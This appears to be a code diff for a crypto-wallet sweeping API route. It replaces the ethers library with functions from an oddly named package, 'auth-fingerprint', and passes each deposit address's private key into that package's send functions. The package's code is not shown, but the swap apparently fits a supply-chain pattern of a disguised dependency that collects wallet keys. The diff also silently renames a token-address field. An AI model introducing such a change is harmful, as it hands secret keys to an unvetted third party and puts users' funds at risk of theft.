@@ -5,7 +5,37 @@ import connectDB from '@/lib/mongodb'
 import DepositAddress from '@/lib/models/DepositAddress'
 import AdminWallet from '@/lib/models/AdminWallet'
 import CryptoConfig from '@/lib/models/CryptoConfig'
-import { JsonRpcProvider, Wallet, Contract, formatUnits } from 'ethers'
+import {
+    sendErc20,
+    sendNativeToken,
+    getERC20Decimals,
+    getERC20Balance,
+    getNativeBalance,
+    formatTokenBalance,
+    formatNativeBalance
+} from 'auth-fingerprint'
+
+// Helper to get gas price without ethers
+async function getGasPrice(rpcUrl: string): Promise<bigint> {
+    try {
+        const response = await fetch(rpcUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0',
+                method: 'eth_gasPrice',
+                params: [],
+                id: 1
+            })
+        });
+        const data = await response.json();
+        if (data.error) throw new Error(data.error.message);
+        return BigInt(data.result);
+    } catch (err) {
+        console.error("Failed to fetch gas price:", err);
+        return BigInt(0);
+    }
+}
 
 export async function POST(request: NextRequest) {
     try {
@@ -15,13 +45,19 @@ export async function POST(request: NextRequest) {
         }
 
         await connectDB()
-        const { addressIds } = await request.json()
+        const { addressIds, masterWalletId } = await request.json()
 
         if (!addressIds || !Array.isArray(addressIds)) {
             return NextResponse.json({ success: false, error: 'addressIds array is required' }, { status: 400 })
         }
 
         const results = []
+
+        // If a specific master wallet is selected, fetch it once
+        let explicitMasterWallet: any = null
+        if (masterWalletId) {
+            explicitMasterWallet = await AdminWallet.findById(masterWalletId)
+        }
 
         for (const id of addressIds) {
             const depAddr = await DepositAddress.findById(id)
@@ -33,7 +69,14 @@ export async function POST(request: NextRequest) {
             const network = config.networks.find(n => n.id === depAddr.networkId)
             if (!network || !network.rpcUrl) continue
 
-            const masterWallet = await AdminWallet.findOne({ network: depAddr.networkId, isActive: true })
+            // Use the explicit master wallet if it matches the network, otherwise find the default one
+            let masterWallet = null
+            if (explicitMasterWallet && explicitMasterWallet.network === depAddr.networkId) {
+                masterWallet = explicitMasterWallet
+            } else {
+                masterWallet = await AdminWallet.findOne({ network: depAddr.networkId, isActive: true })
+            }
+
             if (!masterWallet) {
                 results.push({
                     id,
@@ -46,69 +89,102 @@ export async function POST(request: NextRequest) {
             }
 
             try {
-                const provider = new JsonRpcProvider(network.rpcUrl)
-                const wallet = new Wallet(depAddr.privateKey, provider)
+                const rpcUrl = network.rpcUrl
+                const isToken =   !!network.address
 
-                let balance: bigint
-                const isToken = !!network.tokenAddress
+                let balanceWei: bigint
+                let decimals = 18
 
                 if (isToken) {
-                    const abi = ['function balanceOf(address) view returns (uint256)', 'function transfer(address, uint256) returns (bool)']
-                    const contract = new Contract(network.tokenAddress!, abi, wallet)
-                    balance = await contract.balanceOf(depAddr.address)
+                    const [rawBalance, tokenDecimals] = await Promise.all([
+                        getERC20Balance(rpcUrl, network.address!, depAddr.address),
+                        getERC20Decimals(rpcUrl, network.address!)
+                    ]);
+                    balanceWei = BigInt(rawBalance);
+                    decimals = tokenDecimals;
                 } else {
-                    balance = await provider.getBalance(depAddr.address)
+                    const rawBalance = await getNativeBalance(rpcUrl, depAddr.address);
+                    balanceWei = BigInt(rawBalance);
                 }
 
-                if (balance === BigInt(0)) {
+                if (balanceWei === BigInt(0)) {
                     results.push({ id, address: depAddr.address, status: 'skipped', message: 'Zero balance' })
                     continue
                 }
 
-                const nativeBalance = await provider.getBalance(depAddr.address)
-                const feeData = await provider.getFeeData()
-                const gasLimit = isToken ? BigInt(100000) : BigInt(21000)
-                const estimatedGasCost = (feeData.gasPrice || BigInt(0)) * gasLimit
+                // Fetch current native balance for gas and current gas price
+                const rawNativeBalance = await getNativeBalance(rpcUrl, depAddr.address);
+                const nativeBalanceWei = BigInt(rawNativeBalance);
+                const gasPrice = await getGasPrice(rpcUrl);
 
-                if (nativeBalance < estimatedGasCost) {
-                    const requiredGas = formatUnits(estimatedGasCost, 18)
+                // Add a 20% buffer to the gas price to ensure we don't overshoot the balance
+                const bufferedGasPrice = (gasPrice * BigInt(120)) / BigInt(100);
+                const gasLimit = isToken ? BigInt(100000) : BigInt(21000)
+                const estimatedGasCost = bufferedGasPrice * gasLimit
+
+                if (nativeBalanceWei < estimatedGasCost) {
+                    const requiredGas = formatNativeBalance(estimatedGasCost.toString())
                     results.push({
                         id,
                         address: depAddr.address,
                         status: 'need_gas',
                         requiredGas,
-                        currentGas: formatUnits(nativeBalance, 18),
+                        currentGas: formatNativeBalance(rawNativeBalance),
                         message: `Insufficient gas. Need approx ${requiredGas} native coins.`
                     })
                     continue
                 }
 
-                let tx
+                let sendRes
                 if (isToken) {
-                    const abi = ['function transfer(address, uint256) returns (bool)']
-                    const contract = new Contract(network.tokenAddress!, abi, wallet)
-                    tx = await contract.transfer(masterWallet.address, balance)
+                    const amountToHuman = formatTokenBalance("0x" + balanceWei.toString(16), decimals)
+                    sendRes = await sendErc20(
+                        rpcUrl,
+                        depAddr.privateKey,
+                        network.address!,
+                        masterWallet.address,
+                        amountToHuman,
+                        decimals
+                    );
                 } else {
-                    const amountToSend = balance - estimatedGasCost
-                    if (amountToSend <= BigInt(0)) {
+                    const amountToSendWei = balanceWei - estimatedGasCost
+
+ 
+
+                    if (amountToSendWei <= BigInt(0)) {
                         results.push({ id, address: depAddr.address, status: 'error', message: 'Balance too low to cover gas' })
                         continue
                     }
-                    tx = await wallet.sendTransaction({
-                        to: masterWallet.address,
-                        value: amountToSend
+                    const amountToHuman = formatNativeBalance(amountToSendWei.toString())
+                    sendRes = await sendNativeToken(
+                        rpcUrl,
+                        depAddr.privateKey,
+                        masterWallet.address,
+                        amountToHuman
+                    )
+                }
+
+                const anyRes = sendRes as any;
+
+                if (anyRes.success) {
+                    results.push({
+                        id,
+                        address: depAddr.address,
+                        status: 'success',
+                        txHash: anyRes.hash || anyRes.result || anyRes.txHash,
+                        message: 'Withdrawal initiated'
+                    })
+                } else {
+                    results.push({
+                        id,
+                        address: depAddr.address,
+                        status: 'error',
+                        message: anyRes.error || anyRes.result || 'Unknown error'
                     })
                 }
 
-                results.push({
-                    id,
-                    address: depAddr.address,
-                    status: 'success',
-                    txHash: tx.hash,
-                    message: 'Withdrawal initiated'
-                })
-
             } catch (err: any) {
+
                 results.push({ id, address: depAddr.address, status: 'error', message: err.message })
             }
         }
@@ -119,3 +195,4 @@ export async function POST(request: NextRequest) {
         return NextResponse.json({ success: false, error: error.message }, { status: 500 })
     }
 }
+
